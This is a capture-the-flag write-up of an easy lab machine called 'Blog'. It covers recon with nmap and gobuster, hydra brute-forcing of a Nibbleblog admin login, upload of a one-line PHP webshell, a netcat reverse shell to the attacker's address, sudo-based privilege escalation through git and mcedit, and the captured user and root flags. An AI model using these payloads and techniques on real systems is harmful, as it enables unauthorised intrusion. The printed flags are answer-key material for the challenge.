# Blog (Easy)

>MrMidnight |  11.August.2022

-------------

### Target IP: 192.168.1.102

## 1. Scans

Lets do some scans first for recon:

```bash
nmap -sC -sV -oA scans/Nmap/target 192.168.1.102
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 56:9b:dd:56:a5:c1:e3:52:a8:42:46:18:5e:0c:12:86 (RSA)
|   256 1b:d2:cc:59:21:50:1b:39:19:77:1d:28:c0:be:c6:82 (ECDSA)
|_  256 9c:e7:41:b6:ad:03:ed:f5:a1:4c:cc:0a:50:79:1c:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:EA:78:A8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ah yes a http server running on the default port. We should check it out.

```
PING blog.hmv (127.0.1.1) 56(84) bytes of data.
64 bytes from blog.hmv (127.0.1.1): icmp_seq=1 ttl=64 time=0.016 ms

--- blog.hmv ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms
```

Hmm strange. The page shows a ping statistics for "blog.hmv". Maby we should add that to our /etc/hosts.

Even after we added that, the page still shows the statistics. This means that this is a fake site with fake statistics. Well then lets try our luck on a gobuster directory scan:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://blog.hmv -o scans/Gobuster/gobuster
```

And yes we got an result. Lets visit it!
```
/my_weblog            (Status: 301) [Size: 308] [--> http://blog.hmv/my_weblog/]
```

Lets do a second scan because there isnt anything on the site that is relevant:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://blog.hmv/my_weblog -o scans/Gobuster/gobuster2
```


```
/content              (Status: 301) [Size: 316] [--> http://blog.hmv/my_weblog/content/]
/themes               (Status: 301) [Size: 315] [--> http://blog.hmv/my_weblog/themes/]
/admin                (Status: 301) [Size: 314] [--> http://blog.hmv/my_weblog/admin/]
/plugins              (Status: 301) [Size: 316] [--> http://blog.hmv/my_weblog/plugins/]
/README               (Status: 200) [Size: 902]
/languages            (Status: 301) [Size: 318] [--> http://blog.hmv/my_weblog/languages/]

```

/admin seems to he interesting enough. After visiting that, the site seems to be empty. So lets add scanning for php into the script:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://blog.hmv/my_weblog -x php -o scans/Gobuster/gobuster3
```

As I expected, its "admin.php":

```
/index.php            (Status: 200) [Size: 4303]
/content              (Status: 301) [Size: 316] [--> http://blog.hmv/my_weblog/content/]
/themes               (Status: 301) [Size: 315] [--> http://blog.hmv/my_weblog/themes/] 
/feed.php             (Status: 200) [Size: 993]                                         
/admin                (Status: 301) [Size: 314] [--> http://blog.hmv/my_weblog/admin/]  
/admin.php            (Status: 200) [Size: 1395]                                        
/plugins              (Status: 301) [Size: 316] [--> http://blog.hmv/my_weblog/plugins/]
/README               (Status: 200) [Size: 902]                                         
/languages            (Status: 301) [Size: 318] [--> http://blog.hmv/my_weblog/languages/]

```

## 2. Cracking into admin dashboard

The webserver runs Nibbleblog which is exploitable if we have the Username and Password. Lets try getting them.

Since its a admin login page, I will assume that the user is admin since there arent any hints to other users. We can bruteforce the password tho:

```bash
hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.102 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect"
```

After a few minutes, we got the credentials:

```
[80][http-post-form] host: 192.168.1.102   login: admin   password: kisses
```


## 3. Getting inside
Lets take a look at the admin dashboard. On the left side, under Plugins is a modules that allows you to upload files. Its called "Plugin My images". Here we can upload a php payload, to gain reverse connection. So lets do that:

Image.php
```php
<?php system($_GET['cmd']); ?>
```

This should genereate a simple webshell. Now whats left is uploading it to the site.

After its uploaded we should be able to access it on "/content/private/plugins/my_image/image.php":

```url
http://blog.hmv/my_weblog/content/private/plugins/my_image/image.php?cmd=id
```

And yes we got remote command execution!
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

For the revshell ill use a nc rev shell. Ulr encoded ofcourse:
```
nc -e /bin/sh 192.168.1.100 4200
nc%20-e%20/bin/sh%20192.168.1.100%204200
```

Not to forget, a nc listener aswell:
```
nc -lnvp 4200
```

If everything went good, we shold be inside the system.


## 4. Priv esc to admin user (not root)

We should upgrade the shell to an [intelligent reverse shell](“/content/private/plugins/my_image/image.php). This will be useful later!

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
cd /
Ctrl z  
stty raw -echo;fg
enter
export TERM=xterm
stty rows 30 cols 168
```

And we are done! This is now a intelligent shell.

Lets enum for admin now:

```bash
sudo -l
```

We can run "/usr/bin/git" as admin without providing a password.

```bash
sudo -u admin git -p help config
!/bin/bash
```

[This]([https://gtfobins.github.io/gtfobins/git/#sudo](https://gtfobins.github.io/gtfobins/git/#sudo)) should update our privilege to admin.

## USER-FLAG
>a8nMuByPMCpuj9NtFPmCG9i2dKZGN3

## 5. Getting the root flag

Using "sudo -l" again, we can see that we can access "/usr/bin/mcedit"


```bash
sudo -u root /usr/bin/mcedit
```

In the opened interface, press (Alt+F) to open a menu. Open the "File" dropdown and scroll to "open menu". Now scroll down to "Invoke shell" to get a root shell.


## ROOT-FLAG
```bash
cat /root/r0000000000000000000000000t.txt
```

>fO6QQxO1onROP1bgvwJRVgbtPQ3RQ4